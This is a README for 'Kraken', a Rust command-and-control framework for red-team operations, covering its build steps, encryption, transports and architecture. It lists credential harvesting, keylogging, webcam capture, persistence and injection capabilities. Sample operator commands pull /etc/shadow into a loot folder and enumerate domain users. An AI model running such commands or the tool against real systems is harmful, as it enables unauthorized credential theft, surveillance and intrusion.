<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Kraken/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Kraken/main/docs/assets/logo-light.svg">
  <img alt="Kraken" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Kraken/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Rust](https://img.shields.io/badge/language-Rust-orange.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**OPSEC-first C2 framework built in Rust.**

Research-grade command and control with X25519 key exchange, AES-256-GCM encryption, modular implant architecture, mesh networking, and a CLI operator interface. Nine-crate Cargo workspace with explicit API boundaries.

> **Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.
>
> **Under Active Development**: Kraken is currently being built and is not yet operational. APIs, protocols, and features may change without notice.

</div>

---

## Quick Start

**Prerequisites:** Rust 1.75+, protoc 3.20+, SQLite dev libraries

```bash
git clone https://github.com/Real-Fruit-Snacks/Kraken.git
cd Kraken
just setup && just proto && just build
```

**Start the teamserver:**

```bash
just server
# Listening on 0.0.0.0:50051 (gRPC) and 0.0.0.0:443 (HTTPS)
```

**Connect the operator CLI:**

```bash
just operator -- --server 127.0.0.1:50051
```

**Test with the implant simulator:**

```bash
just sim -- --server https://127.0.0.1:443 --interval 5
```

---

## Features

### Encrypted Communications

X25519 ECDH key exchange with HKDF-SHA256 key derivation. AES-256-GCM bulk encryption with per-message nonces and replay protection.

```bash
# Keys baked at compile time — no runtime key negotiation visible
just implant-linux-x64
```

### Multi-Transport

HTTP/HTTPS, TCP, SMB, and DNS with automatic fallback chains. Transport selection at compile time or runtime.

```bash
just implant-linux-x64  # HTTPS default
just implant-windows-x64  # Cross-compile for Windows
```

### Modular Implant

Minimal hardened core (~50KB) with capability modules loaded at runtime. Shell, file operations, SOCKS proxy, mesh relay, and BOF execution.

```bash
kraken> use shell
kraken> shell whoami
kraken> use file
kraken> download /etc/shadow ./loot/
```

### Mesh Networking

Peer discovery, relay routing, and topology computation. Implants communicate through each other when direct C2 is blocked.

```bash
kraken> mesh topology
kraken> mesh route implant-3 via implant-1,implant-2
```

### Operator CLI

Command-line operator interface. Implant management, task dispatch, structured results, and session tracking.

```bash
just operator -- --server teamserver:50051
# Tab: switch panels | Enter: interact | /: search | q: quit
```

### BOF Compatibility

Rust COFF loader for the Beacon Object File ecosystem. Run existing BOFs without modification.

```bash
kraken> bof load ./SA-whoami.o
kraken> bof exec SA-whoami
```

### Task System

Typed task dispatch with structured results. Queue, track, and export across the implant network.

```bash
kraken> task queue shell "net user /domain"
kraken> task status
kraken> task export --format json
```

### Audit Logging

Append-only structured logs for every operation. Operator actions, implant events, and task results with timestamps and session context.

---

## Capabilities

### Core Operations
| Command | Description | CLI | Web UI |
|---------|-------------|-----|--------|
| `shell` | Execute shell commands | ✓ | ✓ |
| `sleep` | Set callback interval | ✓ | ✓ |
| `cd` / `pwd` / `ls` | Directory navigation | ✓ | ✓ |
| `upload` / `download` | File transfer (chunked for >10MB) | ✓ | ✓ |

### Reconnaissance
| Command | Description | CLI | Web UI |
|---------|-------------|-----|--------|
| `env` | System info, network info, env vars, whoami | ✓ | ✓ |
| `ps` | Process listing and tree view | ✓ | ✓ |
| `scan` | Port scan, ping sweep, share enumeration | ✓ | ✓ |
| `ad` | AD enumeration, Kerberoasting, AS-REP roasting | ✓ | ✓ |
| `reg` | Windows registry operations | ✓ | ✓ |
| `svc` | Windows service management | ✓ | ✓ |

### Credential Harvesting
| Command | Description | CLI | Web UI |
|---------|-------------|-----|--------|
| `creds` | SAM, LSASS, LSA secrets, DPAPI, vault | ✓ | ✓ |
| `browser` | Browser passwords, cookies, history | ✓ | ✓ |
| `wifi` | WiFi credentials | ✓ | ✓ |
| `token` | Token theft, impersonation, privilege enable | ✓ | ✓ |

### Collection
| Command | Description | CLI | Web UI |
|---------|-------------|-----|--------|
| `keylog` | Keylogger start/stop/dump | ✓ | ✓ |
| `clipboard` | Clipboard get/set/monitor | ✓ | ✓ |
| `screenshot` | Single screenshot capture | ✓ | ✓ |
| `screenshot-stream` | Continuous screenshot capture | ✓ | ✓ |
| `audio` | Audio capture | ✓ | ✓ |
| `webcam` | Webcam capture | ✓ | ✓ |
| `usb` | USB device monitoring | ✓ | ✓ |

### Lateral Movement & Persistence
| Command | Description | CLI | Web UI |
|---------|-------------|-----|--------|
| `lateral` | PSExec, WMI, DCOM, WinRM, scheduled tasks | ✓ | ✓ |
| `persist` | 7 persistence methods (registry, schtask, service, startup, WMI, logon script) | ✓ | ✓ |
| `inject` | 9 injection techniques | ✓ | ✓ |
| `rdp` | RDP session hijacking | ✓ | ✓ |
| `ntlm-relay` | NTLM relay setup | ✓ | ✓ |

### Networking
| Command | Description | CLI | Web UI |
|---------|-------------|-----|--------|
| `mesh` | Peer-to-peer mesh networking (TCP/SMB) | ✓ | ✓ |
| `socks` | SOCKS5 proxy | ✓ | ✓ |
| `portfwd` | Port forwarding (forward/reverse) | ✓ | ✓ |

### Modules
| Command | Description | CLI | Web UI |
|---------|-------------|-----|--------|
| `bof` | Beacon Object File execution | ✓ | ✓ |
| `modules` | Dynamic module load/unload | ✓ | ✓ |

---

## Interfaces

- **CLI Operator** — Full-featured terminal UI with tab completion, command history, and Vi mode
- **Web UI** — React-based dashboard with 25+ session tabs, real-time collaboration, and OPSEC risk assessment
- **15 gRPC Services** — Complete API coverage for all operations

---

## Architecture

```
crates/
├── common/        # Shared traits (Module, Transport, CryptoProvider), ID types
├── crypto/        # X25519 ECDH, AES-256-GCM, HKDF-SHA256, Ed25519
├── protocol/      # Protobuf types and serialization (tonic/prost)
├── config/        # Compile-time configuration baking
├── db/            # SQLite via sqlx (PostgreSQL migration path)
├── server/        # Teamserver: gRPC services, HTTP listeners, audit
├── operator/      # CLI: command interface, session management
├── implant-core/  # Minimal kernel: check-in, dispatch, transport chains
└── implant-sim/   # Simulator for testing without real targets
```

Three-tier architecture: Operator (CLI + gRPC client) connects to Teamserver (gRPC + HTTP listener + SQLite) which manages Implants (minimal core + modules). All communication encrypted end-to-end.

---

## Platform Support

| | Linux | Windows | macOS |
|---|---|---|---|
| Teamserver | Full | Full | Full |
| Operator CLI | Full | Full | Full |
| Implant | Full | Full | Planned |
| Cross-compile | Native | MinGW | — |

---

## Security

Report vulnerabilities via [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Kraken/security/advisories/new). See [SECURITY.md](SECURITY.md) for the full policy.

Kraken does **not** include:

- Ransomware, wiper, or destructive capabilities
- Supply chain attack tooling
- Automated mass exploitation

All implant configuration is baked at compile time — no command-line arguments, no environment variable lookups, no runtime artifacts.

---

## License

[MIT](LICENSE) — Copyright 2026 Real-Fruit-Snacks
